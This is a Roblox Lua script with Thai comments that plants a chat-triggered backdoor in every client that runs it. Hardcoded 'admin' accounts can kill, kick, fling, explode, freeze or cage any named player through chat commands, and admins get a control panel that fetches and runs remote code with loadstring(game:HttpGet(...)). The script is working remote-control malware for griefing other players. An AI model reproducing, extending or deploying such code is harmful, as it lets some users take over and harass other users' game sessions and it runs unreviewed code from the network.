local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local Debris = game:GetService("Debris")

-- [ รายชื่อกลุ่มแอดมิน ]
local AdminList = {
    [1697390697] = "OWNER",
    [9802544328] = "ADMIN",
    [6030349781] = "ADMIN",
    [10339491848] = "ADMIN"
}

local function IsAdmin(id) return AdminList[id] ~= nil end

-- ฟังก์ชันรันคำสั่ง (ฝั่งคนโดน)
local function RunCommand(cmd)
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not (char and hum and hrp) then return end

    if cmd == "!kill" then hum.Health = 0
    elseif cmd == "!kick" then LocalPlayer:Kick("191 System: Access Denied")
    elseif cmd == "!fly" then
        local bv = Instance.new("BodyVelocity", hrp)
        bv.Velocity = Vector3.new(0, 150, 0)
        bv.MaxForce = Vector3.new(0, math.huge, 0)
        Debris:AddItem(bv, 3)
    elseif cmd == "!boom" then
        Instance.new("Explosion", workspace).Position = hrp.Position
    elseif cmd == "!freeze" then hrp.Anchored = not hrp.Anchored
    elseif cmd == "!cage" then
        local p = Instance.new("Part", workspace)
        p.Size, p.CFrame, p.Anchored, p.Transparency = Vector3.new(6,8,6), hrp.CFrame, true, 0.5
        p.Color = Color3.new(0,0,0)
        Debris:AddItem(p, 15)
    elseif cmd == "!sit" then hum.Sit = true
    elseif cmd == "!fling" then
        local bV = Instance.new("BodyVelocity", hrp)
        bV.Velocity = Vector3.new(500000, 500000, 500000)
        bV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        local bA = Instance.new("BodyAngularVelocity", hrp)
        bA.AngularVelocity = Vector3.new(10000, 10000, 10000)
        bA.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        hum.PlatformStand = true
        task.wait(0.5) char:BreakJoints()
    end
end

-- ระบบคัดกรองแชท
local function ProcessChat(message, senderId)
    if IsAdmin(senderId) then
        local args = string.split(message:lower(), " ")
        if args[1] and args[2] and string.find(LocalPlayer.Name:lower(), args[2]) then
            RunCommand(args[1])
        end
    end
end

-- ดักฟังคำสั่ง (เลือกใช้ระบบที่แมพนั้นรองรับ)
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(msg)
        if msg.TextSource then ProcessChat(msg.Text, msg.TextSource.UserId) end
    end)
else
    for _, p in pairs(Players:GetPlayers()) do
        p.Chatted:Connect(function(m) ProcessChat(m, p.UserId) end)
    end
    Players.PlayerAdded:Connect(function(p)
        p.Chatted:Connect(function(m) ProcessChat(m, p.UserId) end)
    end)
end

-- [[ ส่วนของแอดมิน ]]
if IsAdmin(LocalPlayer.UserId) then
    local function ApplyTag(char, text)
        local head = char:WaitForChild("Head", 10)
        if not head then return end
        if head:FindFirstChild("Tag191") then head.Tag191:Destroy() end
        local bgui = Instance.new("BillboardGui", head)
        bgui.Name = "Tag191"; bgui.Size = UDim2.new(0,100,0,50); bgui.StudsOffset = Vector3.new(0,3,0); bgui.AlwaysOnTop = true
        local frame = Instance.new("Frame", bgui); frame.Size = UDim2.new(1,0,0.6,0); frame.BackgroundColor3 = Color3.new(0,0,0); frame.BackgroundTransparency = 0.5
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0,8)
        local l = Instance.new("TextLabel", frame); l.Size = UDim2.new(1,0,1,0); l.BackgroundTransparency = 1; l.Text = text; l.TextColor3 = Color3.new(1,1,1); l.TextSize = 16; l.Font = Enum.Font.GothamBold
    end

    for _, p in pairs(Players:GetPlayers()) do
        if p.Character then ApplyTag(p.Character, IsAdmin(p.UserId) and AdminList[p.UserId] or "191") end
        p.CharacterAdded:Connect(function(c) ApplyTag(c, IsAdmin(p.UserId) and AdminList[p.UserId] or "191") end)
    end

    -- โหลด Rayfield UI
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({ Name = "191 MASTER CONTROL" })
    local MainTab = Window:CreateTab("Players", 4483362458)
    local Selected = ""

    local Dropdown = MainTab:CreateDropdown({
       Name = "Target Player",
       Options = {},
       Callback = function(Option) Selected = Option end,
    })

    MainTab:CreateButton({ Name = "Refresh List", Callback = function()
        local list = {}
        for _, p in pairs(Players:GetPlayers()) do if not IsAdmin(p.UserId) then table.insert(list, p.Name) end end
        Dropdown:Set(list)
    end})

    -- *** แก้ไขฟังก์ชัน Send ใหม่ ให้พิมพ์แชทให้อัตโนมัติ ***
    local function MasterSend(command)
        if Selected ~= "" then
            local fullMsg = command .. " " .. Selected
            
            -- วิธีที่ 1: ใช้ระบบ Chat มาตรฐาน (เลียนแบบคนพิมพ์)
            Players:Chat(fullMsg)
            
            -- วิธีที่ 2: บังคับส่งผ่าน Remote (กันเหนียว)
            local sayRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
            if sayRemote and sayRemote:FindFirstChild("SayMessageRequest") then
                sayRemote.SayMessageRequest:FireServer(fullMsg, "All")
            end
        end
    end

    MainTab:CreateSection("Commands")
    local cmds = {"!kill", "!kick", "!fly", "!boom", "!freeze", "!cage", "!sit", "!fling"}
    for _, v in pairs(cmds) do
        MainTab:CreateButton({ Name = v:sub(2):upper(), Callback = function() MasterSend(v) end })
    end
end

